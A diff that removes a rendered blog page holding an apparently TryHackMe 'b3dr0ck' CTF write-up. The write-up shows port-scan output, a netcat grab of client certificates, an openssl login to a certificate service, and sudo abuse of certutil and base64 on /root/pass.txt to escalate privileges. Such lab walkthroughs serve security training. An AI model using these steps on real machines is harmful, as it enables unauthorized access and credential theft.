@@ -1,369 +1,0 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="nair0lf32 ">
-<meta name="description" content="Enum rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf&#43;D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx&#43;JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8&#43;Ng&#43;31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ&#43;oPW6hcWqD2AoPVmmda82Hir&#43;wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE&#43;wqTZw7/JWC5H9xZqapK3wP9gVn&#43;FGN&#43;3JGHKuYKG6ZGc&#43;eRel2XmIVC2PMelF4j2fY0&#43;M8wMpXsa6MJdiyKnJwHC2V13CIvht&#43;L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p&#43;9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx&#43;bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=| 256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIFKDczQ8etcHAV4SsMf7e4ObthBEdiU0W4KFMbqAla7taJBkcChWf136WLVnor&#43;e9yXT0ywIK1xKzwq7c5tZus=| 256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4sG8C6h8Ep0TzcuQinLsiEoA1nY84Gghmr6&#43;sHR&#43;8980/tcp open http syn-ack nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://10.10.19.11:4040/| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)9009/tcp open pichat?" />
-<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="" />
-<link rel="canonical" href="http://localhost:1313/writeups/tryhackme/b3dr0ck/bedrock/" />
-
-
-    <title>
-        
-             :: Zer0ne blog 
-        
-    </title>
-
-
-
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
-
-
-
-<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
-
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
-    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
-
-<meta itemprop="name" content="">
-<meta itemprop="description" content="Enum rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf&#43;D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx&#43;JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8&#43;Ng&#43;31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ&#43;oPW6hcWqD2AoPVmmda82Hir&#43;wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE&#43;wqTZw7/JWC5H9xZqapK3wP9gVn&#43;FGN&#43;3JGHKuYKG6ZGc&#43;eRel2XmIVC2PMelF4j2fY0&#43;M8wMpXsa6MJdiyKnJwHC2V13CIvht&#43;L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p&#43;9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx&#43;bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=| 256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIFKDczQ8etcHAV4SsMf7e4ObthBEdiU0W4KFMbqAla7taJBkcChWf136WLVnor&#43;e9yXT0ywIK1xKzwq7c5tZus=| 256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4sG8C6h8Ep0TzcuQinLsiEoA1nY84Gghmr6&#43;sHR&#43;8980/tcp open http syn-ack nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://10.10.19.11:4040/| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)9009/tcp open pichat?">
-<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
-<meta itemprop="wordCount" content="690"><meta itemprop="image" content="http://localhost:1313/" />
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content=""/>
-<meta name="twitter:description" content="Enum rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf&#43;D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx&#43;JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8&#43;Ng&#43;31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ&#43;oPW6hcWqD2AoPVmmda82Hir&#43;wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE&#43;wqTZw7/JWC5H9xZqapK3wP9gVn&#43;FGN&#43;3JGHKuYKG6ZGc&#43;eRel2XmIVC2PMelF4j2fY0&#43;M8wMpXsa6MJdiyKnJwHC2V13CIvht&#43;L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p&#43;9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx&#43;bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=| 256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIFKDczQ8etcHAV4SsMf7e4ObthBEdiU0W4KFMbqAla7taJBkcChWf136WLVnor&#43;e9yXT0ywIK1xKzwq7c5tZus=| 256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4sG8C6h8Ep0TzcuQinLsiEoA1nY84Gghmr6&#43;sHR&#43;8980/tcp open http syn-ack nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://10.10.19.11:4040/| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)9009/tcp open pichat?"/>
-
-
-
-    <meta property="og:title" content="" />
-<meta property="og:description" content="Enum rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf&#43;D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx&#43;JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8&#43;Ng&#43;31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ&#43;oPW6hcWqD2AoPVmmda82Hir&#43;wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE&#43;wqTZw7/JWC5H9xZqapK3wP9gVn&#43;FGN&#43;3JGHKuYKG6ZGc&#43;eRel2XmIVC2PMelF4j2fY0&#43;M8wMpXsa6MJdiyKnJwHC2V13CIvht&#43;L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p&#43;9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx&#43;bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=| 256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIFKDczQ8etcHAV4SsMf7e4ObthBEdiU0W4KFMbqAla7taJBkcChWf136WLVnor&#43;e9yXT0ywIK1xKzwq7c5tZus=| 256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4sG8C6h8Ep0TzcuQinLsiEoA1nY84Gghmr6&#43;sHR&#43;8980/tcp open http syn-ack nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://10.10.19.11:4040/| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)9009/tcp open pichat?" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/writeups/tryhackme/b3dr0ck/bedrock/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
-
-<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    </head>
-
-    
-        <body>
-    
-    
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="http://localhost:1313/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">#&gt;</span>
-            <span class="logo__text">0/1</span>
-            <span class="logo__cursor" style=
-                  "
-                   background-color:#0FF00D;
-                   animation-duration:2s;">
-            </span>
-        
-    </div>
-</a>
-
-
-        <span class="header__right">
-            
-                <nav class="menu">
-    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
-    </ul>
-</nav>
-
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-            
-                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
- </svg></span>
-        </span>
-    </span>
-</header>
-
-
-            <div class="content">
-                
-    <main class="post">
-
-        <div class="post-info">
-            
-            </p>
-        </div>
-
-        <article>
-            <h2 class="post-title"><a href="http://localhost:1313/writeups/tryhackme/b3dr0ck/bedrock/"></a></h2>
-
-            
-            
-            
-
-            <div class="post-content">
-                <h2 id="enum">Enum</h2>
-<h3 id="rustscan--nmap">rustscan + nmap</h3>
-<pre tabindex="0"><code>PORT     STATE SERVICE REASON  VERSION
-22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf+D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx+JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8+Ng+31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ+oPW6hcWqD2AoPVmmda82Hir+wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE+wqTZw7/JWC5H9xZqapK3wP9gVn+FGN+3JGHKuYKG6ZGc+eRel2XmIVC2PMelF4j2fY0+M8wMpXsa6MJdiyKnJwHC2V13CIvht+L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p+9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx+bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=
-|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIFKDczQ8etcHAV4SsMf7e4ObthBEdiU0W4KFMbqAla7taJBkcChWf136WLVnor+e9yXT0ywIK1xKzwq7c5tZus=
-|   256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4sG8C6h8Ep0TzcuQinLsiEoA1nY84Gghmr6+sHR+89
-
-
-80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
-|_http-title: Did not follow redirect to https://10.10.19.11:4040/
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-
-
-9009/tcp open  pichat? syn-ack
-| fingerprint-strings: 
-|   NULL: 
-|     ____ _____ 
-|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
-|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
-|     \x20/ / / _ \x20|/ __/ _ \| &#39;_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ &lt;| | 
-|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
-|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
-|_    What are you looking for?
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port9009-TCP:V=7.92%I=7%D=11/9%Time=636BA411%P=x86_64-pc-linux-gnu%r(NU
-SF:LL,29E,&#34;\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
-SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
-SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
-SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
-SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
-SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
-SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
-SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
-SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
-SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20&#39;_\
-SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
-SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20&lt;\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
-SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
-SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
-SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
-SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
-SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
-SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
-SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
-SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
-SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
-SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
-SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
-SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
-SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20&#34;);
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-
-54321/tcp open  ssl/unknown syn-ack
-| ssl-cert: Subject: commonName=localhost
-| Issuer: commonName=localhost
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2022-11-09T12:12:34
-| Not valid after:  2023-11-09T12:12:34
-| MD5:   e394 6bba 0f57 8e47 a32a 6a78 a4ab ab3b
-| SHA-1: 6309 8c05 20e6 1676 1acd d610 7ce9 2326 0d2e f012
-| -----BEGIN CERTIFICATE-----
-| MIICrzCCAZcCFF2iBy53F6ZXu7Gqs2Bie4g+c3T2MA0GCSqGSIb3DQEBCwUAMBQx
-| EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yMjExMDkxMjEyMzRaFw0yMzExMDkxMjEy
-| MzRaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
-| ADCCAQoCggEBALfAXQeYK5kMy6Dh1seolv3I/s7SkKAbCyyXbW0ISCgHG0RpLZfS
-| mlZAhDuLI0PClzM+GhxOy801YDjBm+NfRy4vuYNUWa/PL8v7ByJpNYhu5KYNFIx+
-| PeEzx77xy3IX8qNiUnxXnm/hkSjUbDOS+uUjUIys5P7KTYTDp2yXMJ9h3Ax1theZ
-| 0vmdUy0AA0TXZVssQiwjMhXjLBs2ta6sSbWSZyn4ZAAL4vIg9S/qBYLTWU0yHFDI
-| ymD6EdeKTvnQVaFhGy1B2pXUoev5XLjV4p4T9yHLM4ZBQP9iG68HZcmtEs3uMco8
-| 9Dlz6bAkJPvLcbeE9By575mjv4K1Qyt1lYsCAwEAATANBgkqhkiG9w0BAQsFAAOC
-| AQEAjURstDJuwTA90UwdaRIfCZY9hbESA9O6q6Hogp23rUT2bf0Qin+Tz7yVdUfr
-| cjNSKxZ/r5wZPim4ajxyULFfocZZdVDYqjycdxshyEM1ffFYvcqPNNmRH9P7FRsV
-| 6Z3rmtgvb7JgwoiOp/ZM3EDwc0RQhm5RsHKREDRzucb0PSEsmFQLXrDT7gntlbOu
-| UbH1GdsD5DFRF5J98SKzIRl/95YBX7MhMgBt322K6xzUA5Y+hQG+HaY24llJgmgf
-| Lu6dGC+Tm4o1gt2oBSlbH4sHkBeP/6eY9v916kx6rHPIzbvf4MY0LVp4T4xo03lb
-| R0khLKD378qOVXe+oANFbY6qEg==
-|_-----END CERTIFICATE-----
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
-|_    Error: &#39;undefined&#39; is not authorized for access.
-|_ssl-date: TLS randomness does not represent time
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port54321-TCP:V=7.92%T=SSL%I=7%D=11/9%Time=636B9A2E%P=x86_64-pc-linux-g
-SF:nu%r(NULL,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x20authorized\x20for\x
-SF:20access\.\n&#34;)%r(GenericLines,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x2
-SF:0authorized\x20for\x20access\.\n&#34;)%r(GetRequest,31,&#34;Error:\x20&#39;undefine
-SF:d&#39;\x20is\x20not\x20authorized\x20for\x20access\.\n&#34;)%r(HTTPOptions,31,&#34;
-SF:Error:\x20&#39;undefined&#39;\x20is\x20not\x20authorized\x20for\x20access\.\n&#34;)
-SF:%r(RTSPRequest,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x20authorized\x20
-SF:for\x20access\.\n&#34;)%r(RPCCheck,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x
-SF:20authorized\x20for\x20access\.\n&#34;)%r(DNSVersionBindReqTCP,31,&#34;Error:\x
-SF:20&#39;undefined&#39;\x20is\x20not\x20authorized\x20for\x20access\.\n&#34;)%r(DNSSt
-SF:atusRequestTCP,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x20authorized\x20
-SF:for\x20access\.\n&#34;)%r(Help,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x20au
-SF:thorized\x20for\x20access\.\n&#34;)%r(SSLSessionReq,31,&#34;Error:\x20&#39;undefine
-SF:d&#39;\x20is\x20not\x20authorized\x20for\x20access\.\n&#34;)%r(TerminalServerCo
-SF:okie,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x20authorized\x20for\x20acc
-SF:ess\.\n&#34;)%r(TLSSessionReq,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x20aut
-SF:horized\x20for\x20access\.\n&#34;)%r(Kerberos,31,&#34;Error:\x20&#39;undefined&#39;\x20
-SF:is\x20not\x20authorized\x20for\x20access\.\n&#34;)%r(SMBProgNeg,31,&#34;Error:\
-SF:x20&#39;undefined&#39;\x20is\x20not\x20authorized\x20for\x20access\.\n&#34;)%r(X11P
-SF:robe,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x20authorized\x20for\x20acc
-SF:ess\.\n&#34;)%r(FourOhFourRequest,31,&#34;Error:\x20&#39;undefined&#39;\x20is\x20not\x2
-SF:0authorized\x20for\x20access\.\n&#34;)%r(LPDString,31,&#34;Error:\x20&#39;undefined
-SF:&#39;\x20is\x20not\x20authorized\x20for\x20access\.\n&#34;)%r(LDAPSearchReq,31,
-...
-</code></pre><h2 id="exploitation">exploitation</h2>
-<p>First learn about <code>openssl</code></p>
-<p><code>└──╼ $nc 10.10.19.11 9009</code></p>
-<p>grab the files and connect:</p>
-<p><code>OpenSSL&gt; s_client -connect 10.10.19.11:54321 -cert certificate -key private_key </code></p>
-<pre tabindex="0"><code>b3dr0ck&gt; password
-Password hint: [SIKE! ITS REDACTED!] (user = &#39;Barney Rubble&#39;)
-</code></pre><p>No&hellip;no it&rsquo;s not a hash&hellip;</p>
-<p>barney is just that funny</p>
-<pre tabindex="0"><code>barney@b3dr0ck:/home/fred$ sudo -l
-[sudo] password for barney: 
-Matching Defaults entries for barney on b3dr0ck:
-insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User barney may run the following commands on b3dr0ck:
-(ALL : ALL) /usr/bin/certutil
-</code></pre><pre tabindex="0"><code>barney@b3dr0ck:/home/fred$ sudo certutil ls
-
-Current Cert List: (/usr/share/abc/certs)
-------------------
-total 56
-drwxrwxr-x 2 root root 4096 Apr 30  2022 .
-drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
--rw-r----- 1 root root  972 Nov  9 12:12 barney.certificate.pem
--rw-r----- 1 root root 1674 Nov  9 12:12 barney.clientKey.pem
--rw-r----- 1 root root  894 Nov  9 12:12 barney.csr.pem
--rw-r----- 1 root root 1678 Nov  9 12:12 barney.serviceKey.pem
--rw-r----- 1 root root  976 Nov  9 12:12 fred.certificate.pem
--rw-r----- 1 root root 1674 Nov  9 12:12 fred.clientKey.pem
--rw-r----- 1 root root  898 Nov  9 12:12 fred.csr.pem
--rw-r----- 1 root root 1678 Nov  9 12:12 fred.serviceKey.pem
-</code></pre><p>Anyway&hellip;</p>
-<pre tabindex="0"><code>barney@b3dr0ck:/home/fred$ sudo certutil cat fred.servicekey.pem
-Generating credentials for user: cat (fredservicekeypem)
-Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
-Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
- ...
- 
-And once again
-
-```└──╼ $openssl s_client -connect 10.10.19.11:54321 -cert certificate -key private_key 
-CONNECTED(00000003)
-...
-
-b3dr0ck&gt; password
-Password hint: [LIFE IS NO THAT EZ!] (user = &#39;fredservicekeypem&#39;)
-</code></pre><p>switcheroo</p>
-<pre tabindex="0"><code>barney@b3dr0ck:/home/fred$ su fred
-Password: 
-fred@b3dr0ck:~$ id
-uid=1000(fred) gid=1000(fred) groups=1000(fred),24(cdrom),30(dip),46(plugdev),1002(help)
-</code></pre><pre tabindex="0"><code>fred@b3dr0ck:~$ sudo -l
-Matching Defaults entries for fred on b3dr0ck:
-insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User fred may run the following commands on b3dr0ck:
-(ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
-(ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
-</code></pre><p>Lol</p>
-<p>first hint: its encoded multiple times</p>
-<p>second hint: this time it&rsquo;s a hash!!!!</p>
-
-            </div>
-        </article>
-
-        <hr />
-
-        <div class="post-info">
-            
-            
-			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
-  		</div>
-    </main>
-
-            </div>
-
-            
-                <footer class="footer">
-    
-    <div class="footer__inner">
